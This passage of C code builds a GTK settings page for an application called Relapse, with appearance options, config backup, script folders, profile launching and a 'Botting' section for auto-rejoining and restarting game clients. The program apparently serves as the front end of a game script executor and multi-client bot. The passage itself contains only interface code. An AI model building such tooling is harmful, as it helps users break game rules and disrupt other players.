    gtk_box_append(GTK_BOX(angle), GTK_WIDGET(state->gradient_angle));
    gtk_box_append(GTK_BOX(angle), label_new("deg", "settings-description"));
    add_row(appearance_group, "Angle", "Direction the gradient runs in", angle);
    g_signal_connect(state->gradient_angle, "value-changed", G_CALLBACK(appearance_value), state);

    GtkWidget *start = color_button(state, &state->gradient_start);
    GtkWidget *middle = color_button(state, &state->gradient_middle);
    GtkWidget *end = color_button(state, &state->gradient_end);
    GtkWidget *colors = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    gtk_box_append(GTK_BOX(colors), start);
    gtk_box_append(GTK_BOX(colors), middle);
    gtk_box_append(GTK_BOX(colors), end);
    add_row(appearance_group, "Colours", "Start, middle and end stops", colors);

    state->gradient_middle_on = GTK_SWITCH(gtk_switch_new());
    gtk_widget_add_css_class(GTK_WIDGET(state->gradient_middle_on), "gradient-middle");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->gradient_middle_on),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Use the middle colour", -1);
    add_row(appearance_group, "Middle colour", "Blend three stops instead of two",
        GTK_WIDGET(state->gradient_middle_on));
    g_signal_connect(state->gradient_middle_on, "notify::active", G_CALLBACK(appearance_notify), state);

    GtkWidget *opacity = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    state->gradient_opacity = GTK_SPIN_BUTTON(gtk_spin_button_new_with_range(0, 100, 5));
    gtk_widget_add_css_class(GTK_WIDGET(state->gradient_opacity), "gradient-opacity");
    gtk_spin_button_set_numeric(state->gradient_opacity, TRUE);
    gtk_spin_button_set_update_policy(state->gradient_opacity, GTK_UPDATE_IF_VALID);
    gtk_editable_set_width_chars(GTK_EDITABLE(state->gradient_opacity), 3);
    gtk_editable_set_alignment(GTK_EDITABLE(state->gradient_opacity), 1.0);
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->gradient_opacity),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Gradient opacity in percent", -1);
    gtk_box_append(GTK_BOX(opacity), GTK_WIDGET(state->gradient_opacity));
    gtk_box_append(GTK_BOX(opacity), label_new("%", "settings-description"));
    add_row(appearance_group, "Panel transparency", "How much the background shows through the panels", opacity);
    g_signal_connect(state->gradient_opacity, "value-changed", G_CALLBACK(appearance_value), state);

    GtkWidget *radius = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    state->window_radius = GTK_SPIN_BUTTON(gtk_spin_button_new_with_range(0, APPEARANCE_RADIUS_MAX, 1));
    gtk_widget_add_css_class(GTK_WIDGET(state->window_radius), "window-radius");
    gtk_spin_button_set_numeric(state->window_radius, TRUE);
    gtk_spin_button_set_update_policy(state->window_radius, GTK_UPDATE_IF_VALID);
    gtk_editable_set_width_chars(GTK_EDITABLE(state->window_radius), 2);
    gtk_editable_set_alignment(GTK_EDITABLE(state->window_radius), 1.0);
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->window_radius),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Window corner radius in pixels", -1);
    gtk_box_append(GTK_BOX(radius), GTK_WIDGET(state->window_radius));
    gtk_box_append(GTK_BOX(radius), label_new("px", "settings-description"));
    add_row(appearance_group, "Window corners", "Rounding of the window and titlebar", radius);
    g_signal_connect(state->window_radius, "value-changed", G_CALLBACK(appearance_value), state);

    GtkWidget *strength = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    state->background_strength = GTK_SPIN_BUTTON(gtk_spin_button_new_with_range(0, 100, 5));
    gtk_widget_add_css_class(GTK_WIDGET(state->background_strength), "background-strength");
    gtk_spin_button_set_numeric(state->background_strength, TRUE);
    gtk_spin_button_set_update_policy(state->background_strength, GTK_UPDATE_IF_VALID);
    gtk_editable_set_width_chars(GTK_EDITABLE(state->background_strength), 3);
    gtk_editable_set_alignment(GTK_EDITABLE(state->background_strength), 1.0);
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->background_strength),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Background strength in percent", -1);
    gtk_box_append(GTK_BOX(strength), GTK_WIDGET(state->background_strength));
    gtk_box_append(GTK_BOX(strength), label_new("%", "settings-description"));
    add_row(appearance_group, "Background strength",
            "How visible the image or gradient is; 0% hides it", strength);
    g_signal_connect(state->background_strength, "value-changed", G_CALLBACK(appearance_value), state);

    GtkWidget *image_box = gtk_box_new(GTK_ORIENTATION_VERTICAL, 5);
    GtkWidget *image_buttons = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    state->image_button = gtk_button_new_with_label("Choose…");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->image_button),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Choose background image", -1);
    gtk_box_append(GTK_BOX(image_buttons), state->image_button);
    state->image_clear = gtk_button_new_with_label("Clear");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->image_clear),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Clear background image", -1);
    gtk_box_append(GTK_BOX(image_buttons), state->image_clear);
    gtk_box_append(GTK_BOX(image_box), image_buttons);
    state->image_label = GTK_LABEL(gtk_label_new("None selected"));
    gtk_label_set_ellipsize(state->image_label, PANGO_ELLIPSIZE_MIDDLE);
    gtk_label_set_max_width_chars(state->image_label, 16);
    gtk_widget_add_css_class(GTK_WIDGET(state->image_label), "settings-description");
    gtk_box_append(GTK_BOX(image_box), GTK_WIDGET(state->image_label));
    add_row(appearance_group, "Background image", "Use a picture behind the interface instead of the gradient",
            image_box);
    g_signal_connect(state->image_button, "clicked", G_CALLBACK(select_image), page);
    g_signal_connect(state->image_clear, "clicked", G_CALLBACK(image_clear_clicked), state);

    state->image_enabled = GTK_SWITCH(gtk_switch_new());
    gtk_widget_add_css_class(GTK_WIDGET(state->image_enabled), "image-enabled");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->image_enabled),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Show the background image", -1);
    gtk_switch_set_active(state->image_enabled, TRUE);
    add_row(appearance_group, "Show background image",
            "Hide the picture without forgetting which file is selected",
            GTK_WIDGET(state->image_enabled));
    g_signal_connect(state->image_enabled, "notify::active", G_CALLBACK(appearance_notify), state);
    update_image_row(state);

    GtkWidget *search_color = color_button(state, &state->search_picker);
    add_row(appearance_group, "Search box colour",
            "Background of the settings search field; follows panel transparency", search_color);

    state->cover_titlebar = GTK_SWITCH(gtk_switch_new());
    gtk_widget_add_css_class(GTK_WIDGET(state->cover_titlebar), "cover-titlebar");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->cover_titlebar),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Let the background show behind the title bar", -1);
    add_row(appearance_group, "Background in title bar",
            "Let the image or gradient run behind the title bar", GTK_WIDGET(state->cover_titlebar));
    g_signal_connect(state->cover_titlebar, "notify::active", G_CALLBACK(cover_titlebar_changed), state);

    GtkWidget *titlebar_color = color_button(state, &state->titlebar_picker);
    state->titlebar_color_row = add_row(appearance_group, "Title bar colour",
        "Colour used when the background is hidden there", titlebar_color);

    GtkWidget *titlebar_opacity = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    state->titlebar_opacity = GTK_SPIN_BUTTON(gtk_spin_button_new_with_range(0, 100, 5));
    gtk_widget_add_css_class(GTK_WIDGET(state->titlebar_opacity), "titlebar-opacity");
    gtk_spin_button_set_numeric(state->titlebar_opacity, TRUE);
    gtk_spin_button_set_update_policy(state->titlebar_opacity, GTK_UPDATE_IF_VALID);
    gtk_editable_set_width_chars(GTK_EDITABLE(state->titlebar_opacity), 3);
    gtk_editable_set_alignment(GTK_EDITABLE(state->titlebar_opacity), 1.0);
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->titlebar_opacity),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Title bar opacity in percent", -1);
    gtk_box_append(GTK_BOX(titlebar_opacity), GTK_WIDGET(state->titlebar_opacity));
    gtk_box_append(GTK_BOX(titlebar_opacity), label_new("%", "settings-description"));
    state->titlebar_opacity_row = add_row(appearance_group, "Title bar opacity",
        "How opaque the title bar colour is", titlebar_opacity);
    g_signal_connect(state->titlebar_opacity, "value-changed", G_CALLBACK(appearance_value), state);
    update_titlebar_rows(state);

    GtkWidget *backup_group = NULL;
    section_new(appearance_column, "Backup", &backup_group);
    GtkWidget *backup = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    state->bundle_export = gtk_button_new_with_label("Export…");
    gtk_widget_add_css_class(state->bundle_export, "bundle-export");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->bundle_export),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Export config and appearance", -1);
    state->bundle_import = gtk_button_new_with_label("Import…");
    gtk_widget_add_css_class(state->bundle_import, "bundle-import");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->bundle_import),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Import config and appearance", -1);
    gtk_box_append(GTK_BOX(backup), state->bundle_export);
    gtk_box_append(GTK_BOX(backup), state->bundle_import);
    add_row(backup_group, "Config bundle",
            "Save every setting and the background image to a .rlp file, or restore one",
            backup);
    g_signal_connect(state->bundle_export, "clicked", G_CALLBACK(bundle_export_clicked), page);
    g_signal_connect(state->bundle_import, "clicked", G_CALLBACK(bundle_import_clicked), page);

    GtkWidget *output_group = NULL;
    section_new(relapse_column, "Output", &output_group);
    state->output = GTK_SWITCH(gtk_switch_new());
    gtk_widget_add_css_class(GTK_WIDGET(state->output), "redirect-output");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->output),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Redirect script output", -1);
    add_row(output_group, "Redirect script output", "Show your scripts’ output below the editor", GTK_WIDGET(state->output));
    g_signal_connect(state->output, "notify::active", G_CALLBACK(output_changed), state);

    state->single_log = GTK_SWITCH(gtk_switch_new());
    gtk_widget_add_css_class(GTK_WIDGET(state->single_log), "single-log");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->single_log),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "One log file for all clients", -1);
    add_row(output_group, "One log file for all clients",
            "Write every client's rconsole output to relapsegtk.rlog instead of a file per client",
            GTK_WIDGET(state->single_log));
    g_signal_connect(state->single_log, "notify::active", G_CALLBACK(single_log_changed), state);

    GtkWidget *scripts_group = NULL;
    section_new(relapse_column, "Scripts", &scripts_group);
    GtkWidget *scripts = gtk_box_new(GTK_ORIENTATION_VERTICAL, 5);
    state->scripts_button = gtk_button_new_with_label("Select…");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->scripts_button),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Select script folder", -1);
    gtk_box_append(GTK_BOX(scripts), state->scripts_button);
    state->scripts_path_label = GTK_LABEL(gtk_label_new("None selected"));
    gtk_label_set_ellipsize(state->scripts_path_label, PANGO_ELLIPSIZE_MIDDLE);
    gtk_label_set_max_width_chars(state->scripts_path_label, 16);
    gtk_widget_add_css_class(GTK_WIDGET(state->scripts_path_label), "settings-description");
    gtk_box_append(GTK_BOX(scripts), GTK_WIDGET(state->scripts_path_label));
    add_row(scripts_group, "Script folder", "Folder shown in the Scripts library", scripts);
    g_signal_connect(state->scripts_button, "clicked", G_CALLBACK(select_scripts), page);

    GtkWidget *launcher_group = NULL;
    section_new(relapse_column, "Profiles", &launcher_group);
    GtkWidget *launcher = gtk_box_new(GTK_ORIENTATION_VERTICAL, 5);
    state->launcher_button = gtk_button_new_with_label("Select…");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->launcher_button),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Select launcher", -1);
    gtk_box_append(GTK_BOX(launcher), state->launcher_button);
    state->launcher_path = GTK_LABEL(gtk_label_new("None selected"));
    gtk_label_set_ellipsize(state->launcher_path, PANGO_ELLIPSIZE_MIDDLE);
    gtk_label_set_max_width_chars(state->launcher_path, 16);
    gtk_widget_add_css_class(GTK_WIDGET(state->launcher_path), "settings-description");
    gtk_box_append(GTK_BOX(launcher), GTK_WIDGET(state->launcher_path));
    add_row(launcher_group, "Launcher", "Executable used to launch Profiles", launcher);
    g_signal_connect(state->launcher_button, "clicked", G_CALLBACK(select_launcher), page);

    GtkWidget *delay = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    state->launch_delay = GTK_SPIN_BUTTON(gtk_spin_button_new_with_range(
        PROFILES_LAUNCH_DELAY_MIN, PROFILES_LAUNCH_DELAY_MAX, 100));
    gtk_widget_add_css_class(GTK_WIDGET(state->launch_delay), "launch-delay");
    gtk_spin_button_set_numeric(state->launch_delay, TRUE);
    gtk_spin_button_set_update_policy(state->launch_delay, GTK_UPDATE_IF_VALID);
    gtk_editable_set_width_chars(GTK_EDITABLE(state->launch_delay), 5);
    gtk_editable_set_alignment(GTK_EDITABLE(state->launch_delay), 1.0);
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->launch_delay),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Delay between launches in milliseconds", -1);
    gtk_box_append(GTK_BOX(delay), GTK_WIDGET(state->launch_delay));
    gtk_box_append(GTK_BOX(delay), label_new("ms", "settings-description"));
    add_row(launcher_group, "Launch all delay", "Pause between each Profile launch", delay);
    g_signal_connect(state->launch_delay, "value-changed", G_CALLBACK(launch_delay_changed), state);

    GtkWidget *exclude_row = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 20);
    gtk_widget_add_css_class(exclude_row, "settings-row");
    set_row_search_text(exclude_row, "Skip when launching all", "Create a Profile to skip it here.");
    GtkWidget *exclude_labels = gtk_box_new(GTK_ORIENTATION_VERTICAL, 3);
    gtk_widget_set_hexpand(exclude_labels, TRUE);
    gtk_widget_set_valign(exclude_labels, GTK_ALIGN_CENTER);
    gtk_box_append(GTK_BOX(exclude_labels), label_new("Skip when launching all", "settings-label"));
    state->exclude_summary = GTK_LABEL(label_new("Create a Profile to skip it here.",
        "settings-description"));
    gtk_label_set_wrap(state->exclude_summary, TRUE);
    gtk_label_set_max_width_chars(state->exclude_summary, 33);
    gtk_label_set_ellipsize(state->exclude_summary, PANGO_ELLIPSIZE_END);
    gtk_box_append(GTK_BOX(exclude_labels), GTK_WIDGET(state->exclude_summary));
    gtk_box_append(GTK_BOX(exclude_row), exclude_labels);
    GtkWidget *exclude_slot = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 0);
    gtk_widget_set_size_request(exclude_slot, 132, -1);
    gtk_widget_set_valign(exclude_slot, GTK_ALIGN_CENTER);
    state->exclude_button = gtk_button_new_with_label("Configure");
    gtk_widget_add_css_class(state->exclude_button, "configure-excluded");
    gtk_widget_set_halign(state->exclude_button, GTK_ALIGN_END);
    gtk_widget_set_sensitive(state->exclude_button, FALSE);
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->exclude_button),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Choose which Profiles Launch all starts", -1);
    gtk_box_append(GTK_BOX(exclude_slot), state->exclude_button);
    gtk_box_append(GTK_BOX(exclude_row), exclude_slot);
    g_signal_connect(state->exclude_button, "clicked", G_CALLBACK(open_exclude_dialog), state);
    gtk_box_append(GTK_BOX(launcher_group), exclude_row);

    GtkWidget *botting_group = NULL;
    section_new(relapse_column, "Botting", &botting_group);

    state->auto_rejoin = GTK_SWITCH(gtk_switch_new());
    gtk_widget_set_valign(GTK_WIDGET(state->auto_rejoin), GTK_ALIGN_CENTER);
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->auto_rejoin),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Rejoin after a crash", -1);
    add_row(botting_group, "Rejoin after a crash", "Relaunch a client that exits unexpectedly",
        GTK_WIDGET(state->auto_rejoin));
    g_signal_connect(state->auto_rejoin, "notify::active", G_CALLBACK(profiles_control_changed), state);

    state->rejoin_place = GTK_ENTRY(gtk_entry_new());
    gtk_entry_set_placeholder_text(state->rejoin_place, "Place ID");
    gtk_editable_set_width_chars(GTK_EDITABLE(state->rejoin_place), 14);
    gtk_editable_set_max_width_chars(GTK_EDITABLE(state->rejoin_place), 20);
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->rejoin_place),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Place ID joined after a crash or restart", -1);
    add_row(botting_group, "Rejoin place", "Blank keeps the last destination",
        GTK_WIDGET(state->rejoin_place));
    g_signal_connect(state->rejoin_place, "activate", G_CALLBACK(launch_delay_changed), state);

    state->rejoin_job = GTK_ENTRY(gtk_entry_new());
    gtk_entry_set_placeholder_text(state->rejoin_job, "Job ID (optional)");
    gtk_editable_set_width_chars(GTK_EDITABLE(state->rejoin_job), 36);
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->rejoin_job),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Job ID inside the rejoin place", -1);
    add_row(botting_group, "Rejoin job", "Optional server inside that place",
        GTK_WIDGET(state->rejoin_job));
    g_signal_connect(state->rejoin_job, "activate", G_CALLBACK(launch_delay_changed), state);

    GtkWidget *rejoin_fields[] = {GTK_WIDGET(state->rejoin_place), GTK_WIDGET(state->rejoin_job)};
    for (guint i = 0; i < G_N_ELEMENTS(rejoin_fields); ++i) {
        GtkEventController *focus = gtk_event_controller_focus_new();
        g_signal_connect(focus, "leave", G_CALLBACK(profiles_entry_leave), state);
        gtk_widget_add_controller(rejoin_fields[i], focus);
    }

    GtkWidget *restart_every = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    state->restart_minutes = GTK_SPIN_BUTTON(gtk_spin_button_new_with_range(
        0, PROFILES_RESTART_MINUTES_MAX, 1));
    gtk_spin_button_set_numeric(state->restart_minutes, TRUE);
    gtk_spin_button_set_update_policy(state->restart_minutes, GTK_UPDATE_IF_VALID);
    gtk_editable_set_width_chars(GTK_EDITABLE(state->restart_minutes), 4);
    gtk_editable_set_alignment(GTK_EDITABLE(state->restart_minutes), 1.0);
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->restart_minutes),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Minutes between restarts, 0 disables", -1);
    gtk_box_append(GTK_BOX(restart_every), GTK_WIDGET(state->restart_minutes));
    gtk_box_append(GTK_BOX(restart_every), label_new("min", "settings-description"));
    add_row(botting_group, "Restart clients every", "Kill and relaunch every client; 0 turns it off",
        restart_every);
    g_signal_connect(state->restart_minutes, "value-changed", G_CALLBACK(launch_delay_changed), state);

    GtkStringList *restart_items = gtk_string_list_new(NULL);
    gtk_string_list_append(restart_items, "All at once");
    gtk_string_list_append(restart_items, "One by one");
    state->restart_mode = GTK_DROP_DOWN(gtk_drop_down_new(G_LIST_MODEL(restart_items), NULL));
    gtk_widget_set_valign(GTK_WIDGET(state->restart_mode), GTK_ALIGN_CENTER);
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->restart_mode),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Restart style", -1);
    add_row(botting_group, "Restart style", "Together, or one after another",
        GTK_WIDGET(state->restart_mode));
    g_signal_connect(state->restart_mode, "notify::selected", G_CALLBACK(profiles_control_changed), state);

    state->restart_button = gtk_button_new_with_label("Restart now");
    gtk_widget_set_halign(state->restart_button, GTK_ALIGN_END);
    gtk_widget_set_valign(state->restart_button, GTK_ALIGN_CENTER);
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->restart_button),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Restart every running client", -1);
    add_row(botting_group, "Restart clients", "Terminate and relaunch every running client",
        state->restart_button);
    g_signal_connect(state->restart_button, "clicked", G_CALLBACK(restart_clicked), state);

    GtkWidget *extras_group = NULL;
    section_new(relapse_column, "Extras", &extras_group);

    state->raknet = GTK_SWITCH(gtk_switch_new());
    gtk_widget_set_valign(GTK_WIDGET(state->raknet), GTK_ALIGN_CENTER);
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->raknet),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "RakNet", -1);
    add_row(extras_group, "RakNet", "Network library Relapse uses to reach the game",
        GTK_WIDGET(state->raknet));
    g_signal_connect(state->raknet, "notify::active", G_CALLBACK(raknet_toggled), state);

    GtkWidget *open_group = NULL;
    section_new(relapse_column, "Open with", &open_group);
    GtkStringList *open_items = gtk_string_list_new(NULL);
    for (guint i = 0; i < G_N_ELEMENTS(open_with_labels); ++i)
        gtk_string_list_append(open_items, open_with_labels[i]);
    state->open_with = GTK_DROP_DOWN(gtk_drop_down_new(G_LIST_MODEL(open_items), NULL));
    gtk_widget_add_css_class(GTK_WIDGET(state->open_with), "open-with");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->open_with),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Open scripts with", -1);
    gtk_widget_set_valign(GTK_WIDGET(state->open_with), GTK_ALIGN_CENTER);
    add_row(open_group, "Open scripts", "Where clicking a tab name takes you", GTK_WIDGET(state->open_with));
    g_signal_connect(state->open_with, "notify::selected", G_CALLBACK(open_with_selected), state);

    state->open_command = GTK_ENTRY(gtk_entry_new());
    gtk_entry_set_placeholder_text(state->open_command, "code %s");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->open_command),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "External editor command", -1);
    state->open_command_row = add_row(open_group, "Editor command",
        "Command run with the script path; %s is replaced", GTK_WIDGET(state->open_command));
    g_signal_connect(state->open_command, "activate", G_CALLBACK(open_command_committed), state);
    GtkEventController *command_focus = gtk_event_controller_focus_new();
    g_signal_connect(command_focus, "leave", G_CALLBACK(open_command_committed), state);
    gtk_widget_add_controller(GTK_WIDGET(state->open_command), command_focus);
    update_open_command_row(state);

    GtkWidget *about_group = NULL;
    section_new(relapse_column, "Updates", &about_group);
    GtkWidget *update_box = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);
    gtk_widget_set_valign(update_box, GTK_ALIGN_CENTER);
    g_autofree char *running = g_strdup_printf("You are running %s", version);
    gtk_box_append(GTK_BOX(update_box), label_new(running, "settings-description"));
    GtkWidget *check = gtk_button_new_with_label("Check now");
    gtk_widget_add_css_class(check, "check-updates");
    gtk_accessible_update_property(GTK_ACCESSIBLE(check),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Check for updates", -1);
    g_signal_connect_swapped(check, "clicked", G_CALLBACK(settings_check_updates), page);
    gtk_box_append(GTK_BOX(update_box), check);
    add_row(about_group, "Check for updates", "Compare with the latest stable release", update_box);

    settings_search_attach(relapse_content, relapse_column, relapse_header);
    settings_search_attach(appearance_content, appearance_column, appearance_header);
    settings_search_attach(editor_content, editor_column, editor_header);
    return page;
}
